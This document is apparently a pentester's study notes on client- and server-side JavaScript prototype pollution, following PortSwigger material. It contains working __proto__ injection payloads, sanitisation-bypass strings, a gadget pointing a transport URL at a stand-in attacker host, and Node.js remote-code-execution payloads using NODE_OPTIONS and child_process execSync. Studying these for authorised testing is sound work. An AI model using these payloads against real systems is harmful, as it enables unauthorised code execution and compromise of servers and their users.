# Resources
- [Prototype Pollution Playlist - Emanuele Picariello](https://www.youtube.com/playlist?list=PL16wrrijM0H-5TTcdGfdQcsckA_-AcJKB)
- [Prototype Pollution Playlist - Pink Boo](https://www.youtube.com/playlist?list=PL5lc0RaSiwgI3AaYpVQkUBH5NwPj7wzTq)
- [Portswigger Payloads](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
- [BlackFan Payloads](https://github.com/BlackFan/client-side-prototype-pollution)
- [Hacktricks - SSPP to RCE](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce)
# Burp Extension
- DOM Invader
- Server-Side Prototype Pollution Scanner
# Basics
Objects are a collection of key:value pairs known as properties
In Javascript, everything is an object under the hood. Every object is linked to another object of some kind (its prototype)
By default Javascript assigns objects to a built-in prototype
Object property inheritance
Prototype Chain
`__proto__` serves as both a getter and a setter
# How the vulnerabilities arise
User-controllable properties are recursively merged into objects without passing any kind of sanitization
Elements of a prototype pollution attack:
- Prototype Pollution source: Where the property injection happens
- Sink: Where the payload ends up and gets executed
- Exploitable gadget: The vulnerable property
# Sources
- URL query (?) or fragment (#) string
- JSON-based input
- Web messages
## URL query (?) or fragment (#) string
```url
https://vulnerable-website.com/?__proto__[evilProperty]=payload
```
## JSON-based input
```json
{
    "__proto__": {
        "evilProperty": "payload"
    }
}
```
# Sinks
Javascript function or DOM element. Similar to the sinks discussed on DOM XSS
# Gadgets
A Attacker-controlled property used by the application in an unsafe way without proper filtering or sanitazation
Examples
```
https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
https://website.org/patterns/?__proto__%5Bsequence%5D=alert%28document.domain%29-
```
# Client-side prototype pollution vulnerabilities (CSPP)
# Reconnaissance
- Using DOM Invader
- Manual - Using DevTools to study the JavaScript files that are loaded
    - Inject the test payload (and its variations) in the url
        - ?__proto__.foo=bar
    - Go to the console and create a new object and inspect the properties or simply declare "Object.prototype"
    - Check to see if the object inherited the injected property. If it didn't try a different test payload
    - Once prototype pollution has been confirmed, open the Devtools and review the javascript files for a sink
    - After finding the sink, find a gadget
## Finding sources manually 
Injecting arbitrary properties on url query strings, url fragments and any JSON input until a source that works has been found
```
vulnerable-website.com/?__proto__[foo]=bar
vulnerable-website.com/?__proto__.foo=bar
```
Test injection with
```
Object.prototype.foo
```
Using the constructor and non-recursive bypass
```
https://vulnerable-website.com/?constructor.prototype.foo=bar

Bypass non-recursive sanitazation
/?__pro__proto__to__[foo]=bar
/?__pro__proto__to__.foo=bar
/?constconstructorructor[protoprototypetype][foo]=bar
/?constconstructorructor.protoprototypetype.foo=bar
```
## Finding sources using DOM Invader
DOM Invader is able to automatically test for prototype pollution sources as you browse
DOM Invader also can help detect gadgets
The tool can also help find prototype pollution issues in external libraries being used
[DOM Invader Documentation](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#detecting-sources-for-prototype-pollution)
## Prototype pollution via browser APIs
[Portswigger Research on the topic](https://portswigger.net/research/widespread-prototype-pollution-gadgets)
There are several prototype pollution gadgets in the Javascript APIs commonly provided in browsers
### fetch()
This method accepts 2 arguments: The URL and an options object
Prototype pollution may be possible on the options object
### Object.defineProperty()
Bypassing a non-configurable and non-writable property
Polluting Object.prototype with a malicious value property.
```js
Object.prototype.value='overwritten';
```
On url query string
```html
vulnerable-website.com/?__proto__[value]=data:,alert();
```
If this is inherited by the descriptor object passed to Object.defineProperty(), the attacker-controlled value may be assigned to the gadget property after all.
# Server-side Prototype pollution (SSPP)
[Server-side Prototype Pollution - Portswigger Research](https://portswigger.net/research/server-side-prototype-pollution)
# Reconnaissance
- Burp Suite Extension - Server-Side Prototype Pollution Scanner
## Why is server-side prototype pollution more difficult to detect?
- No source code access
- Lack of developer tools
- DoS problem
- Pollution persistence
## Detecting SSPP via polluted property reflection
A Javascript `for...in` loop iterates over all of an object's enumerable properties, even the inherited ones
This also applies for Arrays
If the application later reflects this properties in a response, this could be used to probe for SSPP
POST and PUT requests sending JSON data are good for testing and the server usually responds with the updated JSON data
```http
POST /user/update HTTP/1.1
Host: vulnerable-website.com
...
{
    "user":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "__proto__":{
        "foo":"bar"
    }
}
```
Features that update user's data are worth inspecting as these usually involve merging the incoming data into an existing object
Adding arbitrary properties to your own user could even lead to privilege escalation
## Detecting SSPP without polluted property reflection
- [SSPP Detection without the DoS - Gareth Heyes](https://portswigger.net/research/server-side-prototype-pollution)
- [SSPP Detection without polluted property reflection](https://portswigger.net/web-security/prototype-pollution/server-side#detecting-server-side-prototype-pollution-without-polluted-property-reflection)
Sometimes SSPP is possible and successful but the affected property is not reflected
One approach is to try injecting properties that match potential configuration options for the server
Compare the behavior of the server before and after the pollution
Three techniques are discussed. See the Portswigger Academy content and the research paper for more details
- Status code override: The `status` or `statusCode` property  might be used for injection
```json
{
    "sessionId":"0123456789",
    "username":"wiener",
    "__proto__":{
        "status":555
    }
}
```
- JSON spaces override: The `json spaces` property on Express version <4.17.4. To be able to see the difference in space via the response `Raw`
```json
{
    "sessionId":"0123456789",
    "username":"wiener",
    "__proto__":{
        "json spaces":10
    }
}
```
- Charset override: Use `content-type`
```json
Send UTF-7 data
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"+AGYAbwBv-"
}
Pollute the server and change content-type
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"default",
    "__proto__":{
        "content-type": "application/json; charset=utf-7"
    }
}
Check if the payload is now being decoded as UTF-7
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"foo"
}
```
## Scanning for server-side prototype pollution (SSPP) sources
Automation: Use the Burp Suite extension mentioned at the beginning of the documentation - Server-Side Prototype Pollution Scanner
1. Explore the website
2. Filter to show only in-scope items
3. Select them all. 
4. Right click and go to Extensions -> Server-Side Prototype Pollution Scanner -> Server-Side Prototype Pollution
5. Modify the attack configuration and click OK.
## Bypassing input filters for server-side prototype pollution
This can be bypassed in the same way that it was bypassed for Client-side Prototype Pollution (CSPP)
Example
```json
"constructor": {
    "prototype": {
        "json spaces":10
    }
}
```
## Remote code execution via server-side prototype pollution
There are potential command execution sinks in Node, in the `child_process` module
As these requests occur asynchronously, the best way to test is to trigger an out of band interaction
### NODE_OPTIONS environment variable and shell property
In the example payload shown below the \"\" are very helpful to reduce false positives
```json
"__proto__": {
    "argv0":"node",
    "shell":"node",
    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID\"\".oastify\"\".com"
}
```
### Remote code execution via child_process.fork()
```json
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('command')"
    ]
}
```
